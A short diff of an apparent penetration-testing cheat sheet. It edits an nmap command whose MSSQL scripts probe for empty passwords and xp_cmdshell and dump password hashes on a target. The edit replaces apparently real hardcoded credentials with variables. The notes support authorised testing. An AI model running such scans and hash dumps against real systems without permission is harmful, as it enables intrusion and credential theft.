@@ -244,7 +244,7 @@ mysql -h $ztarg_computer_ip -u root@localhost
 
 ```sh
 # scan / nmap
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=ntgis,mssql.password=Password1,mssql-instance-name=LUXSI -Pn -sV -p 1433 $ztarg_computer_ip
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=$ztarg_user_name,mssql.password=$ztarg_user_pass,mssql-instance-name=XXX -Pn -sV -p 1433 $ztarg_computer_ip
 
 # scan / metasploit / trusted links 
 # set username, password, windows auth (if using AD), IP...
